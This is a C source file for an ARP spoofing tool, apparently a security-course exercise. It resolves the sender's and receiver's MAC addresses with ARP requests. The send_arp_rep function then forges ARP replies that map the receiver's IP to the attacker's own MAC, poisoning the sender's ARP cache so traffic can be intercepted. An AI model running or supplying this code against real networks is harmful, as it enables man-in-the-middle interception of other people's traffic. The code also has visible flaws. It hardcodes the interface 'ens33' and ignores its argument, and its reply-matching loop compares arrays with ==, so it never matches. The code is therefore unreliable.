#include "arp_spoof.h"

void usage(){
	printf("syntax: arp_spoof <interface> <sender_ip> <receiver_ip> ...  \n");
}

void get_my_dev(u_int8_t *ether, u_int8_t *ip, char *dev){
	int fd = socket(AF_INET, SOCK_DGRAM, 0);
	struct ifreq ifr;
	if(fd<0) perror("socket fail");
	strcpy(ifr.ifr_name, "ens33");
	if(ioctl(fd, SIOCGIFHWADDR, &ifr)<0) perror("ioctl fail");  // get MAC address
	memcpy(ether, ifr.ifr_hwaddr.sa_data, 6);
	if(ioctl(fd,SIOCGIFADDR, &ifr)<0) perror("ioctl fail");  // get IP address
	memcpy(ip,&(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr), 4*sizeof(*ip));
}

/* make and send a arp reply packet for sender */
void send_arp_rep(pcap_t *handle, u_int8_t *ip, struct objective_list *list, u_int8_t *my_mac){
	struct make_arp arp_p;
	
	memcpy(arp_p.eth_hdr.ether_dhost, list->sender_mac, 6);
	memcpy(arp_p.eth_hdr.ether_shost, my_mac, 6);
	arp_p.eth_hdr.ether_type = htons(ETHERTYPE_ARP);
	
	arp_p.arp_hdr.ar_hrd = htons(ARPHRD_ETHER);
	arp_p.arp_hdr.ar_pro = htons(ETHERTYPE_IP);
	arp_p.arp_hdr.ar_hln = 0x06;
	arp_p.arp_hdr.ar_pln = 0x04;	
	arp_p.arp_hdr.ar_op = htons(ARPOP_REPLY);
	
	memcpy(arp_p.arp_hdr.arp_sha, my_mac, 6);
	memcpy(arp_p.arp_hdr.arp_spa, list->receiver_ip, 4);
	memcpy(arp_p.arp_hdr.arp_tha, list->sender_mac, 6);
	memcpy(arp_p.arp_hdr.arp_tpa, ip, 4);
													
	pcap_sendpacket(handle, (u_char *)&arp_p, 42);
}

/* make and send a arp request packet to sender and receiver */
void send_arp_req(pcap_t *handle, u_int8_t *ip, struct objective_list *list, u_int8_t *my_mac, u_int8_t *my_ip, int type){
	struct make_arp arp_p;
	u_int8_t broadcast_ether[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
	u_int8_t none_ether[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

	memcpy(arp_p.eth_hdr.ether_dhost, broadcast_ether, 6);
	memcpy(arp_p.eth_hdr.ether_shost, my_mac, 6);
	arp_p.eth_hdr.ether_type = htons(ETHERTYPE_ARP);
								 
	arp_p.arp_hdr.ar_hrd = htons(ARPHRD_ETHER);
	arp_p.arp_hdr.ar_pro = htons(ETHERTYPE_IP);
	arp_p.arp_hdr.ar_hln = 0x06;
	arp_p.arp_hdr.ar_pln = 0x04;
	arp_p.arp_hdr.ar_op = htons(ARPOP_REQUEST);
													
	memcpy(arp_p.arp_hdr.arp_sha, my_mac, 6);
	memcpy(arp_p.arp_hdr.arp_spa, my_ip, 4);
	memcpy(arp_p.arp_hdr.arp_tha, none_ether, 6);
	memcpy(arp_p.arp_hdr.arp_tpa, ip, 4);
													 
	pcap_sendpacket(handle, (u_char *)&arp_p, 42);

	struct ethernet_header *tmp_eth;
	struct arp_header *tmp_arp;
													 
	while(1){
		struct pcap_pkthdr* header;
		const u_char* packet;
		
		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0 || res == -1 || res == -2) continue;
		
		tmp_eth = (struct ethernet_header *)packet;
		if (ntohs(tmp_eth->ether_type) != ETHERTYPE_ARP) continue;
		
		tmp_arp = (struct arp_header *)(packet + sizeof(ethernet_header));
		if (tmp_arp->arp_spa == arp_p.arp_hdr.arp_tpa){
			if(type == 1)  // get mac of sender
				memcpy(list->sender_mac, tmp_arp->arp_sha, 6);
			else  // get mac of receiver
				memcpy(list->receiver_mac, tmp_arp->arp_sha, 6);	
			break;
		}
	}
}


